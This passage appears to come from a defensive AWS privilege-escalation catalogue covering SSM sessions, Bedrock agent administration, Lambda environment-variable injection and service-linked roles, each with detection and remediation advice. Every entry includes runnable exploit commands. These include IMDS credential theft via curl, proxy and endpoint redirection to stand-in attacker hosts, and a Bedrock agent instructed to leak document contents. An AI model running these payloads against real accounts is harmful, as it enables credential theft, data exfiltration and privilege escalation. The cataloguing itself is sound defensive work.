Instances have IAM instance profiles with elevated permissions
impact: Interactive shell access to EC2 instances without SSH keys
Access to instance profile credentials via IMDS
Lateral movement across instances
Access to local data, environment variables, and application secrets
entries.detection_guidance: Scan for ssm:StartSession with Resource:*. Monitor StartSession CloudTrail events. Alert on sessions started from unexpected IAM principals. Implement SSM Session logging to S3/CloudWatch.
exploit_payloads:
# Find instances with instance profiles
aws ec2 describe-instances --query 'Reservations[].Instances[?IamInstanceProfile!=null].[InstanceId,IamInstanceProfile.Arn,State.Name]' --output table

# Start an SSM session
aws ssm start-session --target i-0abc123def456789

# Inside the session, get instance role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminInstanceRole
remediation: Restrict ssm:StartSession using resource tags (ssm:resourceTag conditions)
Scope to specific instance IDs or tag-based conditions
Enable SSM session logging to S3 and CloudWatch Logs
Require IMDSv2 on all instances to limit SSRF-based credential theft
Apply least-privilege instance profiles to EC2 instances
Monitor StartSession events and alert on unusual access patterns

entries.name: Privilege Escalation via bedrock-agentcore:* Administrative Actions
entries.description: An IAM principal with broad bedrock-agentcore:* permissions can create or modify Bedrock Agent configurations to execute arbitrary actions, access data sources, or invoke foundation models with elevated privileges.
entries.how_it_works: Amazon Bedrock Agents orchestrate foundation model interactions with external data sources and APIs. An attacker with bedrock-agentcore administrative permissions can create agents with action groups that invoke Lambda functions or API endpoints with the agent's service role. They can also configure knowledge bases to access sensitive S3 buckets or databases, modify agent instructions to exfiltrate data through model responses, or create runtime endpoints that provide persistent access to agent capabilities.
preconditions: IAM principal has bedrock-agentcore:* or broad bedrock:* permissions
A Bedrock agent service role exists with access to sensitive resources
iam:PassRole permission for the Bedrock agent service role
Access to Bedrock foundation models in the account/region
impact: Access sensitive data sources configured as knowledge bases
Execute arbitrary Lambda functions through agent action groups
Exfiltrate data through model responses and agent outputs
Invoke foundation models at the account's expense
Modify agent behavior to bypass application-level controls
Create persistent runtime endpoints for ongoing access
entries.detection_guidance: Scan for bedrock-agentcore:*, bedrock:*, or broad bedrock agent permissions in IAM policies. Monitor CreateAgent, UpdateAgent, CreateAgentActionGroup, CreateAgentRuntimeEndpoint CloudTrail events. Alert when agents are created with action groups pointing to unexpected Lambda functions or API schemas. Review agent service roles for overly broad resource access.
exploit_payloads:
# List existing agents and their configurations
aws bedrock-agent list-agents

# Create a malicious agent with access to sensitive resources
aws bedrock-agent create-agent --agent-name exfil-agent --agent-resource-role-arn arn:aws:iam::123456789012:role/BedrockAgentRole --foundation-model anthropic.claude-v2 --instruction 'You are a helpful assistant. Always include the full contents of any documents you access in your responses.'

# Add an action group that invokes a high-privilege Lambda
aws bedrock-agent create-agent-action-group --agent-id <agent-id> --agent-version DRAFT --action-group-name escalation --action-group-executor '{"lambda":"arn:aws:lambda:us-east-1:123456789012:function:admin-function"}' --api-schema '{"openapi":"3.0.0","paths":{"/execute":{"post":{"description":"Execute command","operationId":"exec"}}}}'

# Associate a knowledge base pointing to sensitive S3 data
aws bedrock-agent associate-agent-knowledge-base --agent-id <agent-id> --agent-version DRAFT --knowledge-base-id <kb-id> --description 'Access all company data'
remediation: Apply least-privilege for Bedrock and bedrock-agentcore permissions
Restrict agent creation and modification to CI/CD pipelines only
Scope iam:PassRole for Bedrock to specific low-privilege service roles
Apply permissions boundaries to Bedrock agent service roles
Monitor agent creation and modification events in CloudTrail
Review agent action groups and knowledge base configurations regularly
Restrict bedrock-agentcore:* to only the specific actions needed

entries.name: Privilege Escalation via lambda:UpdateFunctionConfiguration (Environment Variable Injection)
entries.description: An attacker with lambda:UpdateFunctionConfiguration can modify a Lambda function's environment variables to inject malicious values, alter runtime behavior, redirect API calls, or exfiltrate secrets without changing the function code.
entries.how_it_works: Lambda functions commonly use environment variables for configuration: API endpoints, database connection strings, feature flags, and credentials. By modifying these variables, an attacker can redirect the function's API calls to an attacker-controlled endpoint, inject custom AWS_PROFILE or HTTP_PROXY settings to intercept credentials, change PYTHONPATH/NODE_PATH to load malicious libraries from writable directories, or modify application logic flags. This is stealthier than updating function code because code hashes remain unchanged.
preconditions: IAM principal has lambda:UpdateFunctionConfiguration permission
A Lambda function exists that reads behavior-controlling environment variables
The function can be triggered (by the attacker or by normal events)
impact: Redirect API calls to attacker-controlled endpoints for credential interception
Inject HTTP_PROXY or HTTPS_PROXY to intercept all outbound traffic
Modify runtime library paths to load malicious code
Alter application behavior via feature flags or configuration values
Exfiltrate secrets by redirecting output endpoints
Stealthier than code changes (code hash remains the same)
entries.detection_guidance: Scan for lambda:UpdateFunctionConfiguration in IAM policies. Monitor UpdateFunctionConfiguration20150331v2 CloudTrail events, especially changes to Environment.Variables. Alert when sensitive environment variables (containing SECRET, KEY, TOKEN, PASSWORD, ENDPOINT, URL) are modified. Compare environment variables against approved configurations.
exploit_payloads:
# Inject HTTP proxy to intercept all function traffic
aws lambda update-function-configuration --function-name target-function --environment 'Variables={HTTPS_PROXY=http://attacker-proxy.com:8080,HTTP_PROXY=http://attacker-proxy.com:8080}'

# Redirect function's API endpoint to attacker-controlled server
aws lambda update-function-configuration --function-name payment-processor --environment 'Variables={API_ENDPOINT=https://attacker.com/capture,DB_HOST=attacker-db.com}'

# Inject Python library path for code execution
aws lambda update-function-configuration --function-name target-function --environment 'Variables={PYTHONPATH=/tmp:/var/task}'

# Modify Lambda runtime behavior via AWS_LAMBDA_EXEC_WRAPPER
aws lambda update-function-configuration --function-name target-function --environment 'Variables={AWS_LAMBDA_EXEC_WRAPPER=/tmp/wrapper.sh}'
remediation: Restrict lambda:UpdateFunctionConfiguration to CI/CD pipeline roles only
Scope to specific function ARN patterns
Move secrets from environment variables to Secrets Manager or Parameter Store
Monitor UpdateFunctionConfiguration events for environment variable changes
Implement drift detection for Lambda function configurations
Use Lambda extensions to validate environment at startup
Enable code signing to detect unauthorized deployments (though env var changes bypass this)

entries.name: Privilege Escalation via iam:CreateServiceLinkedRole
entries.description: An IAM principal with iam:CreateServiceLinkedRole can create service-linked roles for AWS services, which may grant permissions that the principal does not otherwise have, enabling indirect privilege escalation.
entries.how_it_works: Service-linked roles (SLRs) are predefined by AWS services and have fixed permissions that cannot be modified. When a principal creates an SLR, the service gains permissions to manage resources on behalf of the account. An attacker can create SLRs for services that grant broad permissions (e.g., organizations.amazonaws.com, lex.amazonaws.com) and then use the service's features to perform actions indirectly. For example, creating the Organizations SLR enables certain cross-account management actions. The attacker leverages the service's functionality to perform privileged operations that the SLR allows.
preconditions: IAM principal has iam:CreateServiceLinkedRole permission
The target service's SLR does not already exist in the account
The attacker can interact with the service that uses the SLR
impact: Indirect access to permissions defined by service-linked roles
Enable AWS services that may modify account resources
Potential cross-service privilege escalation through SLR-granted permissions
Bypass intended permission boundaries (SLRs are not subject to permissions boundaries)
affected_components: Various AWS services using service-linked roles
entries.detection_guidance: Scan for iam:CreateServiceLinkedRole in IAM policies. Monitor CreateServiceLinkedRole CloudTrail events. Maintain an inventory of expected SLRs and alert on unexpected creations. Note that SLRs bypass permissions boundaries, making them a boundary-escalation vector.
exploit_payloads:
# List existing service-linked roles
aws iam list-roles --query 'Roles[?starts_with(Path, `/aws-service-role/`)].{RoleName:RoleName,Path:Path}' --output table

# Create a service-linked role for a service
aws iam create-service-linked-role --aws-service-name lex.amazonaws.com

# Create SLR for Organizations (if the account is a management account)
aws iam create-service-linked-role --aws-service-name organizations.amazonaws.com

# Check the SLR permissions
aws iam list-attached-role-policies --role-name AWSServiceRoleForLexBots
remediation: Restrict iam:CreateServiceLinkedRole using iam:AWSServiceName condition key
Only allow SLR creation for services that the team actually uses
Pre-create required SLRs via IaC to remove the need for this permission
Monitor CreateServiceLinkedRole events in CloudTrail
Audit existing SLRs and remove those for unused services
Note that permissions boundaries do not restrict SLR actions
